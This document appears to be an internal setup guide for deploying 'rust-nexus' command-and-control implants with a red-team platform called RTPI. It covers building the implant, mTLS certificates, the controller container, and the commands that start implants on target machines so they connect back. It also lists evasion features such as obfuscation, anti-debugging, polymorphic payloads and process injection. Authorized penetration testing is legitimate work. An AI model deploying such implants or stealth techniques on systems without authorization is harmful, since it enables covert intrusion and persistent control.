# rust-nexus Agentic Implants Setup Guide

## Overview

This guide covers the setup and integration of rust-nexus agentic implants with RTPI for distributed penetration testing operations.

## Prerequisites

- Docker and Docker Compose
- Rust toolchain (1.70+)
- Git
- OpenSSL for certificate generation

## Step 1: Clone rust-nexus Repository

**Manual Action Required:**

```bash
# Clone the rust-nexus repository
cd /home/cmndcntrl
git clone https://github.com/cmndcntrlcyber/rust-nexus.git

# Navigate to repository
cd rust-nexus

# Checkout latest stable version
git checkout main

# Build the implant binary
cargo build --release

# Verify build
./target/release/rust-nexus --version
```

## Step 2: Database Setup

The RTPI database migration `0013_add_rust_nexus.sql` creates the following tables:

- `rust_nexus_implants` - Registered implant information
- `rust_nexus_tasks` - Task queue and execution tracking
- `rust_nexus_task_results` - Task output and status
- `rust_nexus_certificates` - mTLS certificate management
- `rust_nexus_telemetry` - Implant health and performance metrics

Apply the migration:

```bash
cd /home/cmndcntrl/rtpi
npm run db:push
```

## Step 3: Certificate Authority Setup

Generate the Certificate Authority for mTLS:

```bash
# Run the CA setup script
tsx server/services/rust-nexus/setup-mtls-ca.ts

# This will create:
# - ca/ca.key (CA private key)
# - ca/ca.crt (CA certificate)
# - ca/server.key (Controller private key)
# - ca/server.crt (Controller certificate)
```

## Step 4: Configure Docker

Add rust-nexus controller to Docker Compose:

```yaml
# In docker-compose.yml
services:
  rust-nexus-controller:
    build: ./rust-nexus
    container_name: rust-nexus-controller
    environment:
      - RUST_LOG=info
      - CONTROLLER_PORT=8443
      - TLS_CERT=/certs/server.crt
      - TLS_KEY=/certs/server.key
      - CA_CERT=/certs/ca.crt
    volumes:
      - ./ca:/certs:ro
    ports:
      - "8443:8443"
    networks:
      - rtpi-network
```

Start the controller:

```bash
docker-compose up -d rust-nexus-controller
```

## Step 5: Deploy Your First Implant

### Generate Implant Certificate

```bash
# Run implant provisioning script
tsx scripts/provision-implant.ts --name "test-implant-01"

# This generates:
# - implants/test-implant-01/client.key
# - implants/test-implant-01/client.crt
# - implants/test-implant-01/config.toml
```

### Deploy Implant Binary

Transfer the following to the target system:

1. `rust-nexus` binary (from rust-nexus/target/release/)
2. `client.crt` and `client.key` (from implants/test-implant-01/)
3. `ca.crt` (CA certificate)
4. `config.toml` (implant configuration)

### Start Implant on Target

On the target system:

```bash
# Linux/macOS
./rust-nexus \
  --config config.toml \
  --controller https://rtpi-server:8443 \
  --cert client.crt \
  --key client.key \
  --ca ca.crt

# Windows
rust-nexus.exe ^
  --config config.toml ^
  --controller https://rtpi-server:8443 ^
  --cert client.crt ^
  --key client.key ^
  --ca ca.crt
```

## Step 6: Verify Implant Registration

Check the RTPI UI or use the API:

```bash
# List registered implants
curl http://localhost:3001/api/v1/rust-nexus/implants

# Get implant details
curl http://localhost:3001/api/v1/rust-nexus/implants/{implant-id}
```

## Architecture

```
┌─────────────────────────────────────────┐
│         RTPI Control Plane              │
│                                          │
│  ┌────────────────────────────────────┐ │
│  │   rust-nexus-controller.ts         │ │
│  │   (WebSocket + mTLS Server)        │ │
│  └────────────────────────────────────┘ │
│              ↕ mTLS                     │
└──────────────┼──────────────────────────┘
               │
   ┌───────────┼───────────┐
   │           │           │
   ▼           ▼           ▼
┌─────┐    ┌─────┐    ┌─────┐
│ I-1 │    │ I-2 │    │ I-3 │
│Win10│    │Linux│    │macOS│
└─────┘    └─────┘    └─────┘
```

## Security Considerations

### mTLS Configuration

- **Certificate Rotation**: Implant certificates expire after 90 days
- **CA Security**: Keep CA private key offline after initial setup
- **Revocation**: Use `tsx scripts/revoke-implant-cert.ts` to revoke compromised certs

### Network Security

- All communication encrypted with TLS 1.3
- Certificate pinning on implant side
- Mutual authentication required

### Implant Hardening

- Binary obfuscation with UPX
- Anti-debugging techniques
- Polymorphic payloads
- Process injection for stealth

## Troubleshooting

### Implant Won't Connect

```bash
# Check controller logs
docker logs rust-nexus-controller

# Verify certificate validity
openssl x509 -in implants/test-implant-01/client.crt -noout -dates

# Test connectivity
openssl s_client -connect rtpi-server:8443 \
  -cert implants/test-implant-01/client.crt \
  -key implants/test-implant-01/client.key \
  -CAfile ca/ca.crt
```

### Task Not Executing

```bash
# Check task queue
tsx -e "
import { db } from './server/db';
import { rustNexusTasks } from '@shared/schema';
const tasks = await db.select().from(rustNexusTasks);
console.log(tasks);
"

# Check implant status
curl http://localhost:3001/api/v1/rust-nexus/implants/{id}/status
```

### Certificate Errors

```bash
# Verify certificate chain
openssl verify -CAfile ca/ca.crt implants/test-implant-01/client.crt

# Regenerate if expired
tsx scripts/provision-implant.ts --name test-implant-01 --force
```

## Best Practices

1. **Certificate Management**:
   - Rotate implant certificates every 30 days
   - Keep CA private key encrypted and offline
   - Use hardware security modules (HSM) for production

2. **Implant Deployment**:
   - Use unique certificates for each implant
   - Implement implant fingerprinting
   - Monitor for duplicate connections

3. **Task Distribution**:
   - Set appropriate task timeouts
   - Implement retry logic for failed tasks
   - Use priority queuing for critical operations

4. **Monitoring**:
   - Track implant heartbeats
   - Monitor task completion rates
   - Set up alerts for implant disconnections

## References

- [rust-nexus Repository](https://github.com/cmndcntrlcyber/rust-nexus)
- [Agentic Implants Enhancement Doc](../enhancements/04-AGENTIC-IMPLANTS.md)
- [mTLS Configuration Guide](./mtls-configuration.md)

---

**Last Updated**: 2025-12-27
**Maintained By**: Platform Engineering Team
